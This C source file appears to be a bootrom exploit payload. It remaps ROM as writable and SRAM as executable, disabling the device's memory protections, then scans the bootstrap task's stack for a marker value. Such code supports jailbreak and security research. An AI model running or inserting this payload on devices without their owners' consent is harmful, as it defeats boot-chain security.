#include "bootrom_func.h"

GLOBAL_LONG(rom_base, 0x100000000)
GLOBAL_LONG(rom_size, 0x2000000)
GLOBAL_LONG(sram_base, 0x180000000)
GLOBAL_LONG(sram_size, 0x2000000)

GLOBAL_PTR(addr_bootstrap_task, ADDR_BOOTSTRAP_TASK)

PAYLOAD_SECTION
void run()
{
    uint64_t *bs_task, *bs_sp, *bs_fp;
    uint32_t bs_val;

    uint64_t rom_base = GET_GLOBAL(rom_base),
            rom_size = GET_GLOBAL(rom_size),
            sram_base = GET_GLOBAL(sram_base),
            sram_size = GET_GLOBAL(sram_size);

    // rw permissions for rom
    map_range(WRITEABLE_ROM(rom_base), rom_base, rom_size, normal_rw);

    // rx permissions for sram
    map_range(EXECUTABLE_SRAM(sram_base), sram_base, sram_size, normal_rx);

    bs_task = GET_GLOBAL(addr_bootstrap_task);
    bs_sp = &bs_task[35]; // stack pointer
    bs_fp = &bs_task[37]; // frame pointer

    while(1)
    {
        // spin if searched entire stack
        if(bs_sp == bs_fp) while(1);

        if(bs_sp >= (uint64_t *) 0x100000000 &&
           bs_sp <= (uint64_t *) 0x100020000)
        {
            bs_val = *bs_sp;
            if(bs_val == 0x37f80000)
                break;
        }

        bs_sp++;
    }
}


void _start()
{
    run();
}